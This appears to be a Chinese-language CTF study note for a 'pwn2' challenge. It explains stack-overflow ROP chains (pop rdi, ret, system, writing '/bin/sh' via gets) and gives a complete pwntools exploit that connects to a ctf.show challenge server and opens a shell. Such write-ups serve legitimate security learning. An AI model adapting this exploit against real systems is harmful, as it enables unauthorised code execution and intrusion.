第一周pwn2

1，payload = b’a’*(0xA+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
2，无binsh时sh也可代替
3，有system无binsh时可以选择写入binsh，用gdb调试来查看可读可写的参数。来利用写入函数来改写参数的值，即
payload = b’a’*offset + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)
p.sendline(payload)
p.sendline(“/bin/sh”)
4，这是64位完整的exp
from pwn import *

padding = 0xA + 8

io = remote(“pwn.challenge.ctf.show”,28294)

system = 0x400520

gets = 0x400530

binsh = 0x603000 - 16

rdi = 0x4007f3
ret = 0x4004fe
payload = b’a’*padding
payload += p64(rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(gets)
payload += p64(rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
io.recv()
io.sendline(payload)
io.sendline(“/bin/sh”)

io.interactive()
照着这个格式来写就行。中间的binsh的位置要要用gdb来找，然后输入vmmap找本地的可读可写的参数就行了再减16.
